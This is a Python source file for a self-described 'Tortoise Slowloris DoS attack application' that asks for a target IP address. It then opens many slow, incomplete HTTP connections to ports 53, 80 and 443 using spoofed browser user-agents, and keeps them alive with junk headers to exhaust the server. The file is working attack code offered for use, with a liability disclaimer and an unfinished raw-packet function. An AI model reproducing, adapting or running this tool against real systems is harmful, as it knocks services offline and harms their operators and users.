""" 
Ansh Menghani
This is the Tortoise Slowloris DoS attack application.
DISCLAIMER: Use this application at your own risk!
The creator of this software is NOT in any way liable for the actions taken with this program.
Enter the target IPv4 address you wish to DoS, the number of connections you wish to open with it, and how long you want to keep each connection open.'Ctrl+C' to quit.
"""

#import necessary modules
import socket
import struct
import random
import time

#initialize variables that will store HTTP(S) headers, socket connections, and target port connections
headers = {
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0": "Accept-language: en-US,en",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36": "Accept-language: en-US,en",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36": "Accept-language: en-US,en",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36": "Accept-language: en-US,en",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14": "Accept-language: en-US,en",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50": "Accept-language: en-US,en",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393": "Accept-language: en-US,en",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36": "Accept-language: en-US,en",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36": "Accept-language: en-US,en",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36": "Accept-language: en-US,en",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36": "Accept-language: en-US,en",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0": "Accept-language: en-US,en",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36": "Accept-language: en-US,en",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36": "Accept-language: en-US,en",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36": "Accept-language: en-US,en",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36": "Accept-language: en-US,en",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0": "Accept-language: en-US,en",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko": "Accept-language: en-US,en",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0": "Accept-language: en-US,en",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36": "Accept-language: en-US,en",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36": "Accept-language: en-US,en",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0": "Accept-language: en-US,en",
}
socks = []
targ_ports = [53, 80, 443]


def construct_packet(raw):
    ip_header = b"\x45\x00\x00\x28\xab\xcd\x00\x00\x40\x06\xa6\xec\x0a\x0a\x0a\x02\x0a\x0a\x0a\x01"
    tcp_header = b"\x30\x39\x00\x50\x00\x00\x00\x00\x00\x00\x00\x00\x50\x02\x71\x10\xe6\x32\x00\x00"



#Sockets class is responsible for creating sockets
class Sockets:
    def __init__(self):
        self.ip_addr = None

    def sockSetup(self, port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        sock.connect((self.ip_addr, port))
        sock.send("GET /?{} HTTP/1.1\r\n".format(str(random.randint(0, 2048))).encode('UTF-8'))
        sock.send("{}\r\n".format(list(headers.keys())[random.randint(0, 21)]).encode("UTF-8"))
        sock.send("{}\r\n".format("Accept-language: en-US,en").encode("UTF-8"))
        return sock

    def startSock(self, targ_port, sock_count, itr):
        global socks
        for i in range(sock_count):
            try:
                print("Socket {}..... ".format(str(i+(sock_count*itr))), end="")
                new_sock = sockets.sockSetup(targ_port)
                print("Successful")
            except socket.error:
                print("Unsuccessful")
                continue
            except Exception:
                raise SystemExit()

            if not new_sock:
                continue
            socks.append(new_sock)


sockets = Sockets()


#main function responsible for executing Slowloris DoS attack and re-establishing lost connections
def main():
    print("This is the Tortoise Slowloris DoS attack application.\nDISCLAIMER: Use this application at your own risk! The creator of this software is NOT in any way liable for the actions taken with this program.\nEnter the target IPv4 address you wish to DoS, the amount of connections you wish to open with it, and how long you want to keep each connection open.\n'Ctrl+C' to quit.\n")
    ip = input("Target IPv4 Address (ex. '127.0.0.1'): ")
    sockets.ip_addr = ip
    socket_count = int(input("Socket Count: "))
    sleep_time = int(input("Slowloris Keep-Alive Time: "))
    print("\nStarting DoS Attack on {}. Connecting to {} sockets with keep-alive time of {} seconds per socket.\nAttempting to connect to ports 53 (DNS), 80 (HTTP), and 443 (HTTPS).\n".format(ip, str(socket_count), str(sleep_time)))
    for idx, p in enumerate(targ_ports):
        sockets.startSock(p, socket_count // len(targ_ports), idx)

    while True:
        try:
            print("Connected to {} socket(s)".format(str(len(socks))))
            for a_sock in socks:
                try:
                    a_sock.send("X-a: {}\r\n".format(str(random.randint(0, 4096))).encode("UTF-8"))
                except socket.error:
                    socks.remove(a_sock)

            diff = socket_count - len(socks)
            if diff <= 0:
                pass
            else:
                for _ in range(0, diff):
                    try:
                        rec_sock = sockets.sockSetup(random.choice(targ_ports))
                        if not rec_sock:
                            continue
                        socks.append(rec_sock)
                    except socket.error:
                        continue

            time.sleep(sleep_time)
        except KeyboardInterrupt:
            break

    try:
        sockets.sockSetup(443)
        print("DoS Unsuccessful.")
    except socket.error:
        print("DoS Complete.")
        raise SystemExit()


#run the code
if __name__ == "__main__":
    try:
        main()
    except Exception:
        print("An error occurred. Aborting.....")
        raise SystemExit()
